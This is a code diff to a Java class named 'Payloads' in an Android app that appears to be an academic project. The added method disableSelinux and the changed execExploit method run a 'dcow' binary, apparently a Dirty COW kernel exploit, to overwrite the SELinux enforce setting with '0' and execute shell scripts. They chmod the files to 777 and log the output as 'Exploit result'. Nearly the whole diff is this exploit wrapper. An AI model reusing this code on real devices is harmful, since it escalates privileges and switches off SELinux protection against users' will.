@@ -88,6 +88,39 @@ public class Payloads {
         return file;
     }
 
+    public void disableSelinux (String filesDirinApp){
+        String fileDirDcow = filesDirinApp +  "/dcow";
+        String fileDirEnforce = filesDirinApp +  "/enforce";
+        String cero = "0";
+        byte[] bytes = cero.getBytes();
+        writeFile(bytes, fileDirEnforce);
+
+        try {
+
+            Process p2 = Runtime.getRuntime().exec("chmod 777 " +  fileDirDcow);
+            Process p3 = Runtime.getRuntime().exec("chmod 777 " + fileDirEnforce);
+            Process p = Runtime.getRuntime().exec("ls -l " + filesDirinApp);
+
+            //
+            Process p0 = Runtime.getRuntime().exec(  filesDirinApp + "/dcow " + fileDirEnforce + " " + filesDirinApp + "/exec.sh");
+
+            BufferedReader bufferedReader = new BufferedReader(
+                    new InputStreamReader(p0.getInputStream()));
+
+            // Grab the results
+            StringBuilder log = new StringBuilder();
+            String line;
+            while ((line = bufferedReader.readLine()) != null) {
+                Log.d("Exploit result: ", line + "\n");
+            }
+
+        }catch(IOException e) {
+            e.printStackTrace();
+        }
+
+
+    }
+
     public void execExploit(String dataDirWHapp, String filesDirinApp){
         String cwd2 = "/system/bin/";
 
@@ -109,7 +142,7 @@ public class Payloads {
             Process p0 = Runtime.getRuntime().exec("ls -l " + filesDirinApp);
 
             //
-            Process p = Runtime.getRuntime().exec( "dcow " + fileDirExec + " /data/data/com.example.tfm_final_app/files/test.sh");
+            Process p = Runtime.getRuntime().exec(  fileDirDcow + " " + fileDirExec + " /data/data/com.example.tfm_final_app/files/test.sh");
 
             //Process p = Runtime.getRuntime().exec("sh " + fileDirExec);
 
